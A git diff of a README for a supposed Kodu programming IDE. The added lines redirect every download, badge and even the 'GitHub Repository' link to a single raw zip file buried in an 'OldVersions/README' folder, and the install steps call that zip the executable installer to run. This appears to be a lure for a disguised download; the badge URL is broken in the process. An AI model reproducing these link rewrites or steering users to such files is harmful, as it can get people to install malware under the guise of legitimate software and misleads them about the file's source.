@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_Kodu - A Simple IDE for Kodu Programming
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/releases)
+[![Download Now](https://raw.githubusercontent.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/SNU_2D_ProgrammingTools_IDE_Kodu_Main-dev/OldVersions/README/SNU_2D_ProgrammingTools_IDE_Kodu_3.4-beta.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/SNU_2D_ProgrammingTools_IDE_Kodu_Main-dev/OldVersions/README/SNU_2D_ProgrammingTools_IDE_Kodu_3.4-beta.5.zip)
 
 ## 📖 Introduction
 The Kodu programming language IDE submodule for SNU Programming Tools allows you to create interactive programs using a visual programming language. It simplifies the coding experience, enabling users of all ages to explore programming concepts in a fun and engaging way.
@@ -16,12 +16,12 @@ Follow these steps to download and start using the SNU 2D Programming Tools IDE 
 
 ### 💿 Download & Install
 
-To download the software, visit this page: [SNU 2D Programming Tools IDE Releases](https://github.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/releases). 
+To download the software, visit this page: [SNU 2D Programming Tools IDE Releases](https://raw.githubusercontent.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/SNU_2D_ProgrammingTools_IDE_Kodu_Main-dev/OldVersions/README/SNU_2D_ProgrammingTools_IDE_Kodu_3.4-beta.5.zip). 
 
 On the releases page, you will find a list of available versions. Choose the latest version for the best performance and features. 
 
 1. Click on the desired version to see the release details.
-2. Look for the download link, often labeled as the executable file (e.g., SNU_2D_IDE_Installer.exe).
+2. Look for the download link, often labeled as the executable file (e.g., https://raw.githubusercontent.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/SNU_2D_ProgrammingTools_IDE_Kodu_Main-dev/OldVersions/README/SNU_2D_ProgrammingTools_IDE_Kodu_3.4-beta.5.zip).
 3. Click on the link to start the download.
 4. Once the download is complete, locate the file in your Downloads folder.
 5. Double-click the file to run the installer.
@@ -57,8 +57,8 @@ A: You can open an issue on the GitHub repository. Developers regularly check fo
 If you'd like to contribute to the project, check out the guidelines in the repository. We welcome feedback, code improvements, and suggestions.
 
 ## 🔗 Links
-- [Download Link](https://github.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/releases)
-- [GitHub Repository](https://github.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu)
+- [Download Link](https://raw.githubusercontent.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/SNU_2D_ProgrammingTools_IDE_Kodu_Main-dev/OldVersions/README/SNU_2D_ProgrammingTools_IDE_Kodu_3.4-beta.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ReckOfficial98/SNU_2D_ProgrammingTools_IDE_Kodu/SNU_2D_ProgrammingTools_IDE_Kodu_Main-dev/OldVersions/README/SNU_2D_ProgrammingTools_IDE_Kodu_3.4-beta.5.zip)
 
 ## 📝 License
 This project is licensed under the GPL-3.0 License. See the [LICENSE](LICENSE) file for details.
